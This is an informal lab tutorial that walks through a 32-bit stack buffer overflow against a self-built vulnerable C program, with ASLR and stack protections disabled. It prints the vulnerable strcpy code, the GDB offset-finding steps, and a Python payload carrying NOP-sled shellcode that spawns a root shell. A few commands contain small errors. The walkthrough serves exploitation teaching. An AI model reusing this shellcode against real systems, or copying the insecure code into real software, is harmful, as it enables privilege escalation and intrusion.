//Step. 1 UPDATE
Sudo apt update
If you have a problem with update and apt failing because of keys. 

sudo wget https://archive.kali.org/archive-key.asc -O /etc/apt/trusted.gpg.d/kali-archive-keyring.asc

If you have a missing public key replace F6BC with the key you need:

sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys F6BC

Sudo apt update

//Step 2. Install GCC libraries 
sudo apt install gcc-multilib

//Step 2.1. Disable ASLR
sudo sysctl -w kernel.randomize_va_space=0


//Step 3. Making the vulnerable application
//Step 3.1 Enter this command in command prompt to create a C script:
nano winner.c

//Step 3.2 Copy+Paste the following code into the window:
---
#include <stdio.h>
#include <string.h>
int main (int argc, char** argv){
 //Make a buffer make this bigger than the minimum you will need
 //You will want to make this large enough to fit shell code and lots of nops
 char buffer[500];
 //copy cmdline input into the buffer.
 strcpy(buffer, argv[1]);
 //return 0 because that is what we do if stuff exits normally.
 return 0;
}
---

//Step 3.3 Compile the code into a vulnerable application by using the command:
gcc -m32 -fno-stack-protector -z execstack -no-pie -g -Wno-implicit-function-declaration winner.c -o winner

//Step 4. Run the vulnerable application with GDB debugger by entering the command:
gdb./winner

//Step 5. Observe Assembly Dump of vulnerable application's 'Main' in GDB by using the command:
disass main

//Step 5.1 Keep note of the memory location of the line just after the 'strcpy' line. For me it was: 0x080491a1.

//Step 5.2 Place a breakpoint at this location in GDB by using the commmand:
b 0x080491a1

//Step 5.3 When prompted about the break point just say 'yes' (y)

//Step 6 Overflow the buffer in GDB by using the command:
run $(msf-pattern_create -l 500)
/note that the -l (is a lower-case 'L' and indicates lenght)
/you should come across a 'program received signal SIGSEGV, Segmentation fault.

//Step 6.1 Check the EIP with the command:
info registers
/for me the eip was 0x6c41376c

//Step 7 Finding the offset
/open a new terminal
/enter the following command to find the offset for eip return address:
msf-pattern_offset -l 500 -q /for me the eip was -0x6c41376c
/for me the exact offset was at 352

//Step 8 overwriting the EIP return address.
/enter the following command to check your offset lets you overwrite EIP return address:
run $(python2.7 -c "print('A'*352 + 'B' * 4 + 'Z'*144)")
/note the EIP address is 4 bytes

//Step 9 making the actual payload and NOP sled
/Step 9.1 make a .py file using Nano:
nano pieshell.py
/note the name is completely arbitrary and is completely up to you
/Step 9.2 Copy+paste the following code into it:
---
#!/usr/bin/python 

nopsled = '\x90' * 64 
shellcode = (
'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
)
padding = 'A' * (352 - 64 - 32)
paddingZ = 'Z' * (500-352-4)
eip = '1234'
print nopsled + shellcode + padding + eip + paddingZ
---
/PLEASE NOTE THAT THE EXAMPLE SHELLCODE IS 32 BYTES!

//Step 9.3 run the vulnerable application using your .py script as input in GDB with the command:
run $(python2.7 ./pieshell.py)

//Step 9.4 examine memory to find what memory location we want to overwrite EIP return address to:
/Enter the command:
x/2000xb($esp-450)

//Step 9.5 find a memory location containing 0x90 (NOP) that is surrounded by other NOPs
/for me I chose the memory location 0xFFFFcbb6

//Step 9.6 convert the address into little endian and add forward slashes (\) and X's:
/for me it is: '\xb6\xcb\xFF\xFF'

//Step 10. Finialising our payload
//open pieshell.py with nano:
nano pieshell.py
//update eip variable to be: '\xb6\xcb\xFF\xFF'

//Step 11 Execute vulnerable application one more time using updated pieshell.py with the command:
run $(python2.7 ./pieshell.py)

/look out for the $ symbol which indicates the dash shell command line
